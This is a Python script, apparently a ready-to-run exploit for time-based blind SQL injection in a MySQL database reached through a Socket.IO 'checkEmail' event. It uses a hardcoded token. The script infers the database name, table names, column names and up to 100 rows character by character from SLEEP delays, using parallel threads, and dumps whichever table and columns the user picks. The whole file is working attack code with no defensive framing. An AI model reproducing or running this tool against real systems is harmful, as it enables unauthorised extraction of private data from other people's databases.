import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import json
import sys
import socketio
import os
import time

"""
Script to exploit a blind SQL injection vulnerability in a MySQL database using a Socket.IO connection.
"""

TOKEN = "MiX1DSlmA3RMmybClt18diLWV9guKV4V"
REQUEST = '42["checkEmail",{{"token":"{token}","email":"t%\' AND {payload} -- "}}]'

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()-=+[]{}|;:,.<>?/~`"
TIMEOUT = 5
SLEEP = 3
lock = threading.Lock()

def make_request(url, payload):
    FOUND = False
    # Remove first two characters as per original logic
    json_str = payload[2:]
    try:
        event_data = json.loads(json_str)
    except json.JSONDecodeError as e:
        print("DEBUG: JSON string to parse:", json_str)
        sys.exit("Failed to parse Socket.IO JSON: {}".format(e))
    if not isinstance(event_data, list) or len(event_data) < 1:
        sys.exit("Invalid Socket.IO request format.")
    event = event_data[0]
    data = event_data[1] if len(event_data) > 1 else None

    sio = socketio.SimpleClient()
    start = time.time()
    try:
        sio.connect(url, transports=['websocket'])
        sio.emit(event, data)
        response = sio.receive()
        if response is not None:
            if "emailFound" in str(response):
                elapsed = time.time() - start
                if elapsed >= SLEEP:
                    FOUND = True            
    except Exception as e:
        pass
    sio.disconnect()
    return FOUND
    

def get_length(url, query):
    """
    Gets the length of a query by going 0-64 and checking if the length of the query is equal to the current number
    """
    print(f"Getting length of query: {query}")
    length = 0
    
    # build the payload
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(make_request, url, REQUEST.format(token=TOKEN, payload=f"IF(LENGTH({query})={i}, SLEEP({SLEEP}), 0)")): i for i in range(1, 65)}
        for future in as_completed(futures):
            if future.result():
                length = futures[future]
                break
    print(f"Length found: {length}")
    return length

def get_count(url, query):
    print(f"Getting count of query: {query}")
    count = 0
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(make_request, url, REQUEST.format(token=TOKEN, payload=f"(SELECT IF((SELECT COUNT(*) FROM {query})={i}, SLEEP(3), 0))")): i for i in range(1, 30)}
        for future in as_completed(futures):
            if future.result():
                count = futures[future]
                break
    print(f"Count found: {count}")
    return count

def get_string(url, query):
    """
    Blindly extracts a string from the database
    """
    print(f"Getting string from query: {query}")
    # Get the length of the query
    length = get_length(url, query)
    print(f"Length: {length}")
    # Get the string
    output = ''
    for j in range(1, length + 1):
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(make_request, url, REQUEST.format(token=TOKEN, payload=f"(SELECT IF(ASCII(SUBSTRING(({query}), {j}, 1))={k}, SLEEP(3), 0))")): k for k in range(32, 127)}
            for future in as_completed(futures):
                if future.result():
                    print(f"Character found: {chr(futures[future])}")
                    output += chr(futures[future])
                    break
    print(f"String found: {output}")
    return output

def get_tables(url, schema):
    print(f"Getting tables from schema: {schema}")
    query = f"INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{schema}'"
    count = get_count(url, query)
    print(f"Table count: {count}")
    tables = []

    for i in range(1, count + 1):
        table = get_string(url, f"(SELECT TABLE_NAME FROM {query} LIMIT {i-1}, 1)")
        tables.append(table)
        print(f"Table {i}: {table}")
    return tables

def main():
    parser = argparse.ArgumentParser(description="Exploit a blind SQL injection vulnerability in a MySQL database using a Socket.IO connection.")
    parser.add_argument("url", help="The URL of the Socket.IO server")
    parser.add_argument("--proxy", help="The proxy to use for the connection")
    args = parser.parse_args()
    # Parse args
    if args.proxy:
        os.environ["HTTP_PROXY"] = args.proxy
        os.environ["HTTPS_PROXY"] = args.proxy
    # Get the length of the database name
    database = get_string(args.url, "(SELECT DATABASE())")
    # Get the table names
    tables = get_tables(args.url, database)
    print("Tables:")
    for table in tables:
        print(table)
    # Ask the user which table they want to dump
    table = input("Enter the table to dump: ")
    # Get count of columns
    query = f"INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table}' AND TABLE_SCHEMA='{database}'"
    count = get_count(args.url, query)
    print(f"Column count: {count}")
    # Get the column names
    for i in range(1, count + 1):
        column = get_string(args.url, f"(SELECT COLUMN_NAME FROM {query} LIMIT {i-1}, 1)")
        print(f"Column {i}: {column}")
    # Ask the user which column(s) they want to dump
    columns = input("Enter the columns to dump (comma separated): ")
    # Get the records
    query = f"{table}"
    records = []
    # Get the data
    for i in range(1, 101):
        record = []
        for column in columns.split(","):
            data = get_string(args.url, f"(SELECT {column} FROM {query} LIMIT {i-1}, 1)")
            record.append(data)
        records.append(record)
    print("Records:")
    for record in records:
        print(record)
        
if __name__ == "__main__":
    main()